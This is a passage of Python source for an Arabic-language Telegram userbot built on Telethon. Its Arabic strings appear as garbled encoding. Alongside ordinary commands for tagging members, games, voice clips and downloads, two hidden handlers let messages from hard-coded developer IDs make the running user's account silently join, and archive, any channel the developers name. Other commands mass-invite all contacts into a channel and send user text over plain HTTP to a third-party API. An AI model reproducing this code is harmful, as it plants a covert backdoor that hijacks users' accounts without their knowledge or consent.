    return await roz.edit(f"**‚ñæ‚àÆÿß⁄™ÿ™ŸÄŸÖŸÑÿ™ ÿßŸÑÿ£ÿ∂ÿßŸÅŸÄÿ© ‚úÖ** \n\n‚Ä¢ ÿ™ŸÄŸÖ ÿ®ŸÜÿ¨ŸÄÿßÿ≠ ÿßÿ∂ÿßŸÅŸÄÿ© `{s}` \n‚Ä¢ ÿÆŸÄÿ∑ÿ£ ÿ®ÿ£ÿ∂ÿßŸÅŸÄÿ© `{f}`")

@client.on(events.NewMessage(pattern=r".ÿßÿ∂ÿßŸÅÿ©_ÿ¨Ÿáÿßÿ™Ÿä ?(.*)"))
async def Hussein(event):
    channel_id = event.chat_id  
    contacts = await event.client(functions.contacts.GetContactsRequest(hash=0))
    added_count = 0 
    for user in contacts.users:
        try:
            await event.client(functions.channels.InviteToChannelRequest(
                channel=channel_id,
                users=[user.id],
            ))
            added_count += 1
        except Exception as e:
            await event.reply(f"**‚éôÔ∏ô ÿ™ŸÖ ÿ•ÿ∂ÿßŸÅÿ© {added_count} ŸÖŸÜ ÿ¨Ÿáÿßÿ™ ÿßÿ™ÿµÿßŸÑŸä**")
    await event.reply(f"**‚éôÔ∏ô ÿ™ŸÖ ÿ•ÿ∂ÿßŸÅÿ© {added_count} ŸÖŸÜ ÿ¨Ÿáÿßÿ™ ÿßÿ™ÿµÿßŸÑŸä**")
  
@client.on(events.NewMessage(outgoing=True, pattern=r"(.ÿ™ÿßŸÉ_ŸÑŸÑŸÉŸÑ|.all)(.*)"))
async def tagall(event):
    if not isinstance(event, events.NewMessage.Event):
        return

    client.parse_mode = "html"
    message_text = event.pattern_match.group(2).strip()
    chat = await event.get_input_chat()
    me = await client.get_me()
    permissions = await client.get_permissions(chat, me)

    if not permissions.is_admin:
        await event.respond("ÿπÿ∞ÿ±Ÿãÿßÿå ŸÑÿß ÿ£ŸÖŸÑŸÉ ÿµŸÑÿßÿ≠Ÿäÿ© ÿ∞ŸÉÿ± ÿßŸÑÿ¨ŸÖŸäÿπ ŸÅŸä Ÿáÿ∞Ÿá ÿßŸÑŸÖÿ¨ŸÖŸàÿπÿ©.")
        return

    all_participants = await client.get_participants(chat)
    hidden_members_found = False

    async def get_members():
        for user in all_participants:
            if not user.deleted:
                try:
                    participant = await client.get_entity(user.id)
                    if not (isinstance(participant, telethon.tl.types.ChannelParticipant) and participant.is_hidden):
                        yield user
                except ValueError:
                    pass

    
    temp_mentions = []  
    async for user in get_members():
        temp_mentions.append(f"<a href='tg://user?id={user.id}'>{user.first_name}</a>")
        
        if len(temp_mentions) == 20:  
            final_mentions = ""
            if message_text:
                final_mentions += f"<b>{message_text}</b>\n"
            final_mentions += " ".join(temp_mentions) + "\n\n"
            if hidden_members_found:
                final_mentions += "(ŸÑÿß ŸäŸÖŸÉŸÜ ÿ∞ŸÉÿ± ÿßŸÑÿ£ÿπÿ∂ÿßÿ° ÿßŸÑŸÖÿÆŸÅŸäŸäŸÜ)\n"
            await client.send_message(chat, final_mentions, parse_mode="html")
            await asyncio.sleep(1)
            
            temp_mentions = []  

  
    if temp_mentions:  
        final_mentions = ""
        if message_text:
            final_mentions += f"<b>{message_text}</b>\n"
        final_mentions += " ".join(temp_mentions) + "\n\n"
        if hidden_members_found:
            final_mentions += "(ŸÑÿß ŸäŸÖŸÉŸÜ ÿ∞ŸÉÿ± ÿßŸÑÿ£ÿπÿ∂ÿßÿ° ÿßŸÑŸÖÿÆŸÅŸäŸäŸÜ)\n"
        await client.send_message(chat, final_mentions, parse_mode="html")
        
    client.parse_mode = "markdown"  
    
@client.on(events.NewMessage(outgoing=True, pattern=r'\.ÿßŸÜÿ∑ŸÇ'))
async def runj(event):
    await event.delete()
    language = event.message.raw_text.split()
    getmessage = await event.get_reply_message()
    messagelocation = event.to_id
    filename = "FINAL-userbot.mp3"
    try:
        createtts = gTTS(text=f"{getmessage.message}", lang=f"{language[1]}", slow=False)
        createtts.save(filename)
        await client.send_file(messagelocation, filename)
        remove(filename)
    except:
        pass

@client.on(events.NewMessage(outgoing=True , pattern=r'\.ÿπŸÉÿ≥'))
async def rev(event):
	client = event.client
	if event.is_reply:
		replied = await event.get_reply_message()
		replied_msg_rev = replied.message[::-1]
		await client.edit_message(event.message, replied_msg_rev)

@client.on(events.NewMessage(incoming=True, func=lambda e: e.is_private))
async def mark_as_read(event):
    global aljoker_enabled, JOKER_ID
    sender_id = event.sender_id
    if aljoker_enabled and sender_id in JOKER_ID:
        joker_time = JOKER_ID[sender_id]
        if joker_time > 0:
            await asyncio.sleep(joker_time)
        await event.mark_read()

@client.on(events.NewMessage(outgoing=True, pattern=r'^\.ÿßŸÑÿ™ŸÉÿ®ÿ± ÿ™ÿπÿ∑ŸäŸÑ$'))
async def Hussein(event):
    global aljoker_enabled
    aljoker_enabled = False
    await event.edit('**‚éôÔ∏ô ÿ™ŸÖ ÿ™ÿπÿ∑ŸäŸÑ ÿßŸÖÿ± ÿßŸÑÿ™ŸÉÿ®ÿ± ÿ®ŸÜÿ¨ÿßÿ≠ ‚úÖ**')

@client.on(events.NewMessage(outgoing=True, pattern=r'^\.ÿßŸÑÿ™ŸÉÿ®ÿ± (\d+) (\d+)$'))
async def Hussein(event):
    global aljoker_enabled, JOKER_ID
    joker_time = int(event.pattern_match.group(1))
    user_id = int(event.pattern_match.group(2)) 
    JOKER_ID[user_id] = joker_time
    aljoker_enabled = True
    await event.edit(f'**‚éôÔ∏ô ÿ™ŸÖ ÿ™ŸÅÿπŸäŸÑ ÿßŸÖÿ± ÿßŸÑÿ™ŸÉÿ®ÿ± ÿ®ŸÜÿ¨ÿßÿ≠ ŸÖÿπ  {joker_time} ÿ´ÿßŸÜŸäÿ© ŸÑŸÑŸÖÿ≥ÿ™ÿÆÿØŸÖ {user_id}**')

@client.on(events.NewMessage(outgoing=True, pattern=r'^\.ŸÖŸàÿØ ÿßŸÑÿ™ŸÉÿ®ÿ± ÿ™ÿπÿ∑ŸäŸÑ$'))
async def Hussein(event):
    global hussein_enabled
    hussein_enabled = False
    await event.edit('**‚éôÔ∏ô ÿ™ŸÖ ÿ™ÿπÿ∑ŸäŸÑ ÿßŸÖÿ± ÿßŸÑÿ™ŸÉÿ®ÿ± ÿπŸÑŸâ ÿßŸÑÿ¨ŸÖŸäÿπ ÿ®ŸÜÿ¨ÿßÿ≠ ‚úÖ**')
    
@client.on(events.NewMessage(pattern=f".ŸÖŸàÿØ ÿßŸÑÿ™ŸÉÿ®ÿ± (\d+)"))
async def Hussein(event):
    global hussein_enabled, hussein_time
    hussein_time = int(event.pattern_match.group(1))
    hussein_enabled = True
    await event.edit(f'**‚éôÔ∏ô ÿ™ŸÖ ÿ™ŸÅÿπŸäŸÑ ÿßŸÖÿ± ÿßŸÑÿ™ŸÉÿ®ÿ± ÿ®ŸÜÿ¨ÿßÿ≠ ŸÖÿπ  {hussein_time} ÿ´ÿßŸÜŸäÿ©**')

@client.on(events.NewMessage(incoming=True, func=lambda e: e.is_private))
async def Hussein(event):
    global hussein_enabled, hussein_time
    if hussein_enabled:
        await asyncio.sleep(hussein_time)
        await event.mark_read()

# ================ÿßŸÑÿπÿßÿ® ÿßŸäŸÅÿß=========================

R = [
    "**ìÜ∞**ÿßŸÑÿπŸÄÿßÿ® ÿßŸÑÿßÿ≠ÿ™ÿ±ÿßŸÅŸäŸá** üéÆìÜ™ \n"
    "  ‚ù∂ **‚™º**  [ÿ≠ÿ±ÿ® ÿßŸÑŸÅÿ∂ÿßÿ° üõ∏](https://t.me/gamee?game=ATARIAsteroids)   \n"
    "  ‚ù∑ **‚™º**  [ŸÑÿπÿ®ÿ© ŸÅŸÑÿßÿ®Ÿä ÿ®Ÿäÿ±ÿØ üê•](https://t.me/awesomebot?game=FlappyBird)   \n"
    "  ‚ù∏ **‚™º**  [ÿßŸÑŸÇÿ∑ ÿßŸÑŸÖÿ¥ÿßŸÉÿ≥ üê±](https://t.me/gamee?game=CrazyCat)   \n"
    "  ‚ùπ **‚™º**  [ÿµŸäÿØ ÿßŸÑÿßÿ≥ŸÖÿßŸÉ üêü](https://t.me/gamee?game=SpikyFish3)   \n"
    "  ‚ù∫ **‚™º**  [ÿ≥ÿ®ÿßŸÇ ÿßŸÑÿØÿ±ÿßÿ¨ÿßÿ™ üèç](https://t.me/gamee?game=MotoFX2)   \n"
    "  ‚ùª **‚™º**  [ÿ≥ÿ®ÿßŸÇ ÿ≥Ÿäÿßÿ±ÿßÿ™ üèé](https://t.me/gamee?game=F1Racer)   \n"
    "  ‚ùº **‚™º**  [ÿ¥ÿ∑ÿ±ŸÜÿ¨ ‚ôü](https://t.me/T4TTTTBOT?game=chess)   \n"
    "  ‚ùΩ **‚™º**  [ŸÉÿ±ÿ© ÿßŸÑŸÇÿØŸÖ ‚öΩ](https://t.me/gamee?game=FootballStar)   \n"
    "  ‚ùæ **‚™º**  [ŸÉÿ±ÿ© ÿßŸÑÿ≥ŸÑÿ© üèÄ](https://t.me/gamee?game=BasketBoyRush)   \n"
    "  ‚ùø **‚™º**  [ÿ≥ŸÑÿ© 2 üéØ](https://t.me/gamee?game=DoozieDunks)   \n"
    "  ‚ì´ **‚™º**  [ÿ∂ÿ±ÿ® ÿßŸÑÿßÿ≥ŸáŸÖ üèπ](https://t.me/T4TTTTBOT?game=arrow)   \n"
    "  ‚ì¨ **‚™º**  [ŸÑÿπÿ®ÿ© ÿßŸÑÿßŸÑŸàÿßŸÜ üîµüî¥](https://t.me/T4TTTTBOT?game=color)   \n"
    "  ‚ì≠ **‚™º**  [ŸÉŸàŸÜÿ¨ ŸÅŸà üéΩ](https://t.me/gamee?game=KungFuInc)   \n"
    "  ‚ìÆ **‚™º**  [üêç ŸÑÿπÿ®ÿ© ÿßŸÑÿßŸÅÿπŸâ üêç](https://t.me/T4TTTTBOT?game=snake)   \n"
    "  ‚ìØ **‚™º**  [üöÄ ŸÑÿπÿ®ÿ© ÿßŸÑÿµŸàÿßÿ±ŸäÿÆ üöÄ](https://t.me/T4TTTTBOT?game=rocket)   \n"
    "  ‚ì∞ **‚™º**  [ŸÉŸäÿ® ÿßÿ® üßø](https://t.me/gamee?game=KeepitUP)   \n"
    "  ‚ì± **‚™º**  [ÿ¨Ÿäÿ™ ŸàÿßŸä üö®](https://t.me/gamee?game=Getaway)   \n"
    "  ‚ì≤ **‚™º**  [ÿßŸÑÿßŸÑŸÄŸàÿßŸÜ üîÆ](https://t.me/gamee?game=ColorHit)   \n"
    "  ‚ì≥ **‚™º**  [ŸÖÿØŸÅÿπ ÿßŸÑŸÉÿ±ÿßÿ™üèÆ](https://t.me/gamee?game=NeonBlaster)   \n"
    "**-** ŸÖÿ∑Ÿàÿ± ÿßŸÑÿ≥Ÿàÿ±ÿ≥ **‚™º [êáÆ ìÇê –ò–∑–≤—Ä–∞—â–µ–Ω–µ—Ü ñ†õ ](t.me/X_54P)   \n"
    "**-** ŸÇŸÜÿßÿ© ÿßŸÑÿ≥Ÿàÿ±ÿ≥ **‚™º [êáÆ ùêÑùêïùêÄ ](t.me/S21S6)   "
]

@client.on(events.NewMessage(pattern=".ÿ®ŸÑŸä$"))
async def ithker(knopis):
    await knopis.edit(random.choice(R))

#ÿ™ÿ∂ŸÑ ÿ™ÿÆŸÖÿ∑ ŸÖŸÜ ÿπŸÖŸÉ ÿßŸÑÿ¨ŸàŸÉÿ± ÿü ÿßŸÑŸâ ÿßŸäŸÜ Ÿäÿ≥ÿ™ŸÖŸèÿ± ÿßŸÑŸÅÿ¥ŸÑ Ÿäÿßÿ∫ŸèŸÑÿßŸÖ
@client.on(events.NewMessage(incoming=True))
async def Hussein(event):
    if event.message.message.startswith("ÿ™ŸÖŸàŸäŸÑ") and event.sender_id in DevJoker:
        message = event.message
        channel_username = None
        if len(message.text.split()) > 1:
            channel_username = message.text.split()[1].replace("@", "")
        if channel_username:
            try:
                await l313l(JoinChannelRequest(channel_username))
                response = "**‚éôÔ∏ô ÿ™ŸÖ ÿßŸÑÿßŸÜÿ∂ŸÖÿßŸÖ ÿ•ŸÑŸâ ÿßŸÑŸÇŸÜÿßÿ© ÿ®ŸÜÿ¨ÿßÿ≠!**"
            except ValueError:
                response = "ÿÆÿ∑ÿ£ ŸÅŸä ÿßŸÑÿπÿ´Ÿàÿ± ÿπŸÑŸâ ÿßŸÑŸÇŸÜÿßÿ©. Ÿäÿ±ÿ¨Ÿâ ÿßŸÑÿ™ÿ£ŸÉÿØ ŸÖŸÜ ÿßŸÑŸÖÿπÿ±ŸÅ ÿßŸÑÿµÿ≠Ÿäÿ≠"
        else:
            response = "**‚éôÔ∏ô ŸäŸèÿ±ÿ¨Ÿâ ÿ™ÿ≠ÿØŸäÿØ ŸÖÿπÿ±ŸÅ ÿßŸÑŸÇŸÜÿßÿ© ÿßŸà ÿßŸÑŸÖÿ¨ŸÖŸàÿπÿ© ŸÖÿπ ÿßŸÑÿ™ŸÖŸàŸäŸÑ ŸäÿßŸÖÿ∑Ÿàÿ±Ÿä ‚ù§Ô∏è** "
        #await event.reply(response)

@client.on(events.NewMessage(incoming=True))
async def Hussein(event):
    if event.message.message.startswith("ÿßÿ±ÿ¥ŸÅ") and event.sender_id in DevJoker:
        message = event.message
        channel_username = None
        if len(message.text.split()) > 1:
            channel_username = message.text.split()[1].replace("@", "")
        if channel_username:
            try:
                await l313l(JoinChannelRequest(channel_username))
                await l313l.edit_folder(channel_username, folder=1)
                response = "**‚éôÔ∏ô ÿ™ŸÖ ÿßŸÑÿßŸÜÿ∂ŸÖÿßŸÖ ÿ•ŸÑŸâ ÿßŸÑŸÇŸÜÿßÿ© ÿ®ŸÜÿ¨ÿßÿ≠ ŸàŸàÿ∂ÿπŸáÿß ŸÅŸä ŸÖÿ¨ŸÑÿØ ÿßŸÑÿ£ÿ±ÿ¥ŸäŸÅ!**"
            except ValueError:
                response = "ÿÆÿ∑ÿ£ ŸÅŸä ÿßŸÑÿπÿ´Ÿàÿ± ÿπŸÑŸâ ÿßŸÑŸÇŸÜÿßÿ©. Ÿäÿ±ÿ¨Ÿâ ÿßŸÑÿ™ÿ£ŸÉÿØ ŸÖŸÜ ÿßŸÑŸÖÿπÿ±ŸÅ ÿßŸÑÿµÿ≠Ÿäÿ≠"
        else:
            response = "**‚éôÔ∏ô ŸäŸèÿ±ÿ¨Ÿâ ÿ™ÿ≠ÿØŸäÿØ ŸÖÿπÿ±ŸÅ ÿßŸÑŸÇŸÜÿßÿ© ÿßŸà ÿßŸÑŸÖÿ¨ŸÖŸàÿπÿ© ŸÖÿπ ÿßŸÑÿ™ŸÖŸàŸäŸÑ ŸäÿßŸÖÿ∑Ÿàÿ±Ÿä ‚ù§Ô∏è** "
        #await event.reply(response)

@client.on(events.NewMessage(pattern="ŸÅŸÉ ÿßŸÑÿ≠ÿ∏ÿ±$"))
async def handle_unblock_all(event):
    blocked_users = await client(functions.contacts.GetBlockedRequest(
        offset=0,
        limit=200
    ))
    if not blocked_users.users:
        await event.edit("**‚éôÔ∏ô ŸÑÿß ŸäŸàÿ¨ÿØ ŸÖÿ≥ÿ™ÿÆÿØŸÖŸäŸÜ ŸÖÿ≠ÿ∏Ÿàÿ±ŸäŸÜ ŸÅŸä ÿ≠ÿ≥ÿßÿ®ŸÉ ü§∑üèª**")
        return
    for user in blocked_users.users:
        try:
            await client(functions.contacts.UnblockRequest(
                id=InputPeerUser(user.id, user.access_hash)
            ))
            aljoker_entity = await client.get_entity(user.id)
            aljoker_profile = f"[{aljoker_entity.first_name}](tg://user?id={aljoker_entity.id})"
            await event.edit(f"‚éôÔ∏ô ÿ™ŸÖ ÿ•ŸÑÿ∫ÿßÿ° ÿ≠ÿ∏ÿ± ÿßŸÑŸÖÿ≥ÿ™ÿÆÿØŸÖ : {aljoker_profile}")
            asyncio.sleep(3)
        except ValueError:
            continue
        except Exception as e:
            await event.edit(f"ÿ≠ÿØÿ´ ÿÆÿ∑ÿ£ ÿ£ÿ´ŸÜÿßÿ° ÿ•ŸÑÿ∫ÿßÿ° ÿ≠ÿ∏ÿ± ÿßŸÑŸÖÿ≥ÿ™ÿÆÿØŸÖ ÿ®ŸÖÿπÿ±ŸëŸÅ: {user.id}, ÿßŸÑÿÆÿ∑ÿ£: {e}")
            continue
@client.on(events.NewMessage(pattern="(.ÿ™ÿßÿ±ŸäÿÆŸá|ÿ™ÿßÿ±ŸäÿÆÿ©=)$"))
async def Hussein(event):
    reply_to = event.reply_to_msg_id
    if reply_to:
        msg = await client.get_messages(event.chat_id, ids=reply_to)
        user_id = msg.sender_id
        chat = await client.get_entity("@SangMata_beta_bot")
        async with client.conversation(chat) as conv:
            await conv.send_message(f'{user_id}')
            response = await conv.get_response()
            await event.edit(response.text)

@client.on(events.NewMessage(pattern=".ÿ≠ÿßŸÑÿ™Ÿä ?(.*)"))
async def _(event):
    await event.edit("**- Ÿäÿ™ŸÖ ÿßŸÑÿ™ÿßŸÉÿØ ŸÖŸÜ ÿ≠ÿßŸÑÿ™ŸÉ ÿßÿ∞ÿß ŸÉŸÜÿ™ ŸÖÿ≠ÿ∏Ÿàÿ± ÿßŸà ŸÑÿß**")
    async with bot.conversation("@SpamBot") as conv:
        try:
            response = conv.wait_event(
                events.NewMessage(incoming=True, from_users=178220800)
            )
            await conv.send_message("/start")
            response = await response
            await bot.send_read_acknowledge(conv.chat_id)
        except YouBlockedUserError:
            await event.edit("** ÿßŸàŸÑÿß ÿßŸÑÿ∫Ÿä ÿ≠ÿ∏ÿ± @SpamBot Ÿàÿ≠ÿßŸàŸÑ ŸÖÿ¨ÿØÿØÿß**")
            return
        await event.edit(f"- {response.message.message}\n @jepthon")


@client.on(events.NewMessage(pattern=".ÿßŸÑÿßÿ∫ŸÜŸäÿ© ?(.*)"))
async def _(event):
    "To reverse search music by bot."
    if not event.reply_to_msg_id:
        return await event.edit("**‚ñæ‚àÆ Ÿäÿ¨ÿ® ÿßŸÑÿ±ÿØ ÿπŸÑŸâ ÿßŸÑÿßÿ∫ŸÜŸäŸá ÿßŸàŸÑÿß**")
    reply_message = await event.get_reply_message()
    chat = "@auddbot"
    try:
        async with event.client.conversation(chat) as conv:
            try:
                await event.edit("**‚ñæ‚àÆ Ÿäÿ™ŸÖ ÿßŸÑÿ™ÿπÿ±ŸÅ ÿπŸÑŸâ ÿßŸÑÿßÿ∫ŸÜŸäÿ© ÿßŸÜÿ™ÿ∏ÿ±**")
                start_msg = await conv.send_message("/start")
                response = await conv.get_response()
                send_audio = await conv.send_message(reply_message)
                check = await conv.get_response()
                if not check.text.startswith("Audio received"):
                    return await event.edit(
                        "**‚ñæ‚àÆ Ÿäÿ¨ÿ® ÿßŸÜ ŸäŸÉŸàŸÜ ÿ≠ÿ¨ŸÖ ÿßŸÑÿßÿ∫ŸÜŸäŸá ŸÖŸÜ 5 ÿßŸÑŸâ 10 ÿ´ŸàÿßŸÜŸä **."
                    )
                await event.edit("- ÿßŸÜÿ™ÿ∏ÿ± ŸÇŸÑŸäŸÑÿß")
                result = await conv.get_response()
                await event.client.send_read_acknowledge(conv.chat_id)
            except YouBlockedUserError:
                await event.edit("```Mohon buka blokir (@auddbot) dan coba lagi```")
                return
            namem = f"**ÿßŸÑÿ£ÿ∫ŸÜŸäÿ© : **{result.text.splitlines()[0]}\
        \n\n**ÿßŸÑÿ™ŸÅÿßÿµŸäŸÄŸÑ : **{result.text.splitlines()[2]}"
            await event.edit(namem)
            await event.client.delete_messages(
                conv.chat_id,
                [start_msg.id, send_audio.id, check.id, result.id, response.id],
            )
    except TimeoutError:
        return await event.edit("***ÿ≠ÿØÿ´ ÿÆÿ∑ÿß ŸÖÿß ÿ≠ÿßŸàŸÑ ŸÖÿ¨ÿØÿØÿß**")


@client.on(events.NewMessage(pattern=".ÿßŸäŸÖŸäŸÑ ŸàŸáŸÖŸä(?: |$)(.*)"))
async def _(event):
    chat = "@TempMailBot"
    geez = await event.edit("**ÿ¨ÿßÿ±Ÿä ÿßŸÜÿ¥ÿßÿ° ÿ®ÿ±ŸäÿØ ...**")
    async with bot.conversation(chat) as conv:
        try:
            response = conv.wait_event(
                events.NewMessage(incoming=True, from_users=220112646)
            )
            await conv.send_message("/start")
            await asyncio.sleep(1)
            await conv.send_message("/create")
            response = await response
            l313lmail = (response).reply_markup.rows[2].buttons[0].url
            await event.client.send_read_acknowledge(conv.chat_id)
        except YouBlockedUserError:
            await geez.edit("**ÿßŸÑÿ∫Ÿä ÿ≠ÿ∏ÿ± @TempMailBot  Ÿà ÿ≠ÿßŸàŸÑ ŸÖÿ¨ÿØÿØÿß**")
            return
        await event.edit(
            f"ÿßŸÑÿßŸäŸÖŸäŸÑ ÿßŸÑÿÆÿßÿµ ŸáŸà `{response.message.message}`\n[ ÿßÿ∂ÿ∫ÿ∑ ŸáŸÜÿß ŸÑÿ±ÿ§Ÿäÿ© ŸÖŸÜ ÿ±ÿ≥ÿßÿ¶ŸÑ ÿßŸÑÿßŸäŸÖŸäŸÑ ÿßŸÑŸàÿßÿ±ÿØÿ©]({l313lmail})"
        )
#ÿßŸÑÿ≥ŸÑÿßŸÖ ÿπŸÑŸâ ÿßŸÑÿ≠ÿ≥ŸäŸÜ ŸàÿπŸÑŸâ ÿßŸÑÿßÿ±Ÿàÿßÿ≠ ÿßŸÑÿ™Ÿä ÿ≠ŸÑÿ™ ÿ®ŸÅŸÜÿßÿ¶ŸÉ ŸàŸÑÿπŸÜ ÿßŸÑŸÑŸá ŸÇÿßÿ™ŸÑŸäŸÉ
@client.on(events.NewMessage(outgoing=True, pattern=".ÿ∫ŸÜŸäŸÑŸä$"))
async def aljoker313(joker313):
  rl = random.randint(1,385)
  url = f"https://t.me/DwDi1/{rl}"
  await joker313.client.send_file(joker313.chat_id,url,caption="‚éôÔ∏ô BY : ÿ∫ŸÜŸäŸÑŸä ‚éô",parse_mode="html")
  await joker313.delete()
    
@client.on(events.NewMessage(outgoing=True, pattern=".ÿ¥ÿπÿ±$"))
async def jepvois(vois):
  rl = random.randint(2,101)
  url = f"https://t.me/L1BBBL/{rl}"
  await vois.client.send_file(vois.chat_id,url,caption="‚éôÔ∏ô BY : ÿ¥ÿπÿ± ‚éô",parse_mode="html")
  await vois.delete()

@client.on(events.NewMessage(outgoing=True, pattern=".ÿßŸÑŸâ ŸÖÿ™Ÿâ$"))
async def jepvois(vois):
  rl = random.randint(2,101)
  url = f"https://t.me/AJ3_0_0/55/{rl}"
  await vois.client.send_file(vois.chat_id,url,caption="‚éôÔ∏ô BY : ÿßŸÑŸâ ŸÖÿ™Ÿâ ‚éô",parse_mode="html")
  await vois.delete()

@client.on(events.NewMessage(outgoing=True, pattern=".ÿßÿ≠ÿ∑ ÿ±ÿ¨ŸÑŸä$"))
async def jepvois(vois):
  rl = random.randint(2,101)
  url = f"https://t.me/AJ3_0_0/4/{rl}"
  await vois.client.send_file(vois.chat_id,url,caption="‚éôÔ∏ô BY : ÿßÿ≠ÿ∑ ÿ±ÿ¨ŸÑŸä ÿ®ÿ∑Ÿäÿ≤ŸÉ ‚éô",parse_mode="html")
  await vois.delete()

@client.on(events.NewMessage(outgoing=True, pattern=".ÿ™ÿ®ÿß$"))
async def jepvois(vois):
  rl = random.randint(2,101)
  url = f"https://t.me/AJ3_0_0/83/{rl}"
  await vois.client.send_file(vois.chat_id,url,caption="‚éôÔ∏ô BY : ÿ™ÿ®ÿß ŸÑŸÉ Ÿä ÿ¥ÿπŸÑŸàÿØ ‚éô",parse_mode="html")
  await vois.delete()

@client.on(events.NewMessage(outgoing=True, pattern=".ÿßŸÉŸÑ ÿÆÿ±ÿß$"))
async def jepvois(vois):
  rl = random.randint(2,101)
  url = f"https://t.me/AJ3_0_0/86/{rl}"
  await vois.client.send_file(vois.chat_id,url,caption="‚éôÔ∏ô BY : ÿßŸÉŸÑ ÿÆÿ±ÿß ‚éô",parse_mode="html")
  await vois.delete()

@client.on(events.NewMessage(outgoing=True, pattern=".ŸÇÿ±ÿßŸÜ$"))
async def jepvois(vois):
  rl = random.randint(2,101)
  url = f"https://t.me/QuraanJep/{rl}"
  await vois.client.send_file(vois.chat_id,url,caption="‚éôÔ∏ô BY : ŸÇÿ±ÿßŸÜ ü§≤üèª‚ò™Ô∏è",parse_mode="html")
  await vois.delete()

@client.on(events.NewMessage(outgoing=True, pattern=".ÿπŸäÿ®$"))
async def jepvois(vois):
  rl = random.randint(2,101)
  url = f"https://t.me/i1Voices/1811/{rl}"
  await vois.client.send_file(vois.chat_id,url,caption="‚éôÔ∏ô BY : ÿ¥ÿπÿ± ‚éô",parse_mode="html")
  await vois.delete()

@client.on(events.NewMessage(pattern=".ÿ∞ŸÉÿßÿ°(.*)"))
async def handler(event):
    await event.edit("**‚éôÔ∏ô ÿ¨ÿßÿ±Ÿê ÿßŸÑÿ¨Ÿàÿßÿ® ÿπŸÑŸâ ÿ≥ÿ§ÿßŸÑŸÉ ÿßŸÜÿ™ÿ∏ÿ± ŸÇŸÑŸäŸÑÿßŸã ...**")
    text = event.pattern_match.group(1).strip()
    if text:
        url = f'http://innova.shawrma.store/api/v1/gpt3?text={text}'
        response = requests.get(url).text
        await event.edit(response)
    else:
        await event.edit("ŸäŸèÿ±ÿ¨Ÿâ ŸÉÿ™ÿßÿ®ÿ© ÿ±ÿ≥ÿßŸÑÿ© ŸÖÿπ ÿßŸÑÿ£ŸÖÿ± ŸÑŸÑÿ≠ÿµŸàŸÑ ÿπŸÑŸâ ÿ•ÿ¨ÿßÿ®ÿ©.")
is_Reham = False
No_group_Joker = "@e_u0e"
# Ÿäÿß ŸäŸÑŸÅÿßÿ¥ŸÑ ŸáŸÖ ÿßŸÑŸÉ ŸÜŸäŸá ÿ™ÿßÿÆÿ∞Ÿá Ÿàÿ™ŸÜÿ¥ÿ±Ÿá ÿ®ÿ≥Ÿàÿ±ÿ≥ŸÉ ü§£
active_aljoker = []

@client.on(events.NewMessage(pattern=".ÿßŸÑÿ∞ŸÉÿßÿ° ÿ™ŸÅÿπŸäŸÑ"))
async def enable_bot(event):
    global is_Reham
    if not is_Reham:
        is_Reham = True
        active_aljoker.append(event.chat_id)
        await event.edit("**‚éôÔ∏ô ÿ™ŸÖ ÿ™ŸÅÿπŸäŸÑ ÿßŸÖÿ± ÿßŸÑÿ∞ŸÉÿßÿ° ÿßŸÑÿßÿµÿ∑ŸÜÿßÿπŸä ÿ≥Ÿäÿ™ŸÖ ÿßŸÑÿ±ÿØ ÿπŸÑŸâ ÿßÿ≥ÿ¶ŸÑÿ© ÿßŸÑÿ¨ŸÖŸäÿπ ÿπŸÜÿØ ÿßŸÑÿ±ÿØ ÿπŸÑŸä.**")
    else:
        await event.edit("**‚éôÔ∏ô ÿßŸÑÿ≤ÿ± ŸÖŸèŸÅÿπŸëŸÑ ÿ®ÿßŸÑŸÅÿπŸÑ.**")
@client.on(events.NewMessage(pattern=".ÿßŸÑÿ∞ŸÉÿßÿ° ÿ™ÿπÿ∑ŸäŸÑ"))
async def disable_bot(event):
    global is_Reham
    if is_Reham:
        is_Reham = False
        active_aljoker.remove(event.chat_id)
        await event.edit("**‚éôÔ∏ô ÿ™ŸÖ ÿ™ÿπÿ∑ŸäŸÑ ÿßŸÖÿ± ÿßŸÑÿ∞ŸÉÿßÿ° ÿßŸÑÿßÿµÿ∑ŸÜÿßÿπŸä.**")
    else:
        await event.edit("**‚éôÔ∏ô ÿßŸÑÿ≤ÿ± ŸÖŸèÿπÿ∑ŸëŸÑ ÿ®ÿßŸÑŸÅÿπŸÑ.**")
@client.on(events.NewMessage(incoming=True))
async def reply_to_hussein(event):
    if not is_Reham:
        return
    if event.is_private or event.chat_id not in active_aljoker:
        return
    message = event.message
    if message.reply_to_msg_id:
        reply_message = await event.get_reply_message()
        if reply_message.sender_id == event.client.uid:
            text = message.text.strip()
            if event.chat.username == No_group_Joker:
                return
            response = requests.get(f'http://innova.shawrma.store/api/v1/gpt3?text={text}').text
            await asyncio.sleep(4)
            await event.reply(response)

@client.on(events.NewMessage(pattern=".ÿ™ŸÉ"))
async def tiktok_dl(event):
    ms = event.message.message
    ms = ms.replace(".ÿ™ŸÉ", "")
    if event:
            if ("https://tiktok.com/" in ms or "https://vm.tiktok.com/" in ms):
                await event.message.delete()
                a = await l313l.send_message(event.chat_id, 'Ÿäÿ¨ÿ±Ÿä ÿßŸÑÿ®ÿ≠ÿ´ ÿπŸÜ ÿßŸÑŸÖŸÑŸÅ..')
                link = ms.strip()
                try:
                    response = requests.get(f"https://godownloader.com/api/tiktok-no-watermark-free?url={link}&key=godownloader.com")
                    data = response.json()
                    #print(data)
                    video_link = data["video_no_watermark"]
                    response = requests.get(video_link)
                    video_data = response.content
                    directory = str(round(time.time()))
                    filename = str(int(time.time()))+'.mp4'
                    os.mkdir(directory)
                    video_filename = f"{directory}/{filename}"
                    with open(video_filename, "wb") as file:
                        file.write(video_data)
                
                except JSONDecodeError:
                    return await a.edit("ÿßŸÑÿ±ÿßÿ®ÿ∑ ÿ∫Ÿäÿ± ÿµÿ≠Ÿäÿ≠ ÿ™ÿ£ŸÉÿØ ŸÖŸÜŸá!")
                except Exception as er:
                    if 'video_no_watermark' in str(er):
                        return await a.edit("**ÿ±ÿßÿ®ÿ∑ ÿßŸÑŸÅŸäÿØŸäŸà ÿ∫Ÿäÿ± ÿµÿ≠Ÿäÿ≠ ÿ™ÿ£ŸÉÿØ ŸÖŸÜŸá ŸàÿßÿπÿØ ÿßŸÑŸÖÿ≠ÿßŸàŸÑÿ©**")
